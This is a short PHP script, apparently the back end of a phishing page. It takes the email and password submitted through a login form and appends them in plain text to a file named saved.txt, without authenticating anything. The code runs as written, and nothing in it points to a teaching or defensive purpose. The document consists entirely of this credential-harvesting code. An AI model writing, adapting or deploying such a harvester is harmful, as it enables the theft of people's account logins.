<?php

$Name = "Username:".$_POST['email']."
";
$Pass = "Password:".$_POST['pass']."
";
$file=fopen("saved.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fclose($file);

?>
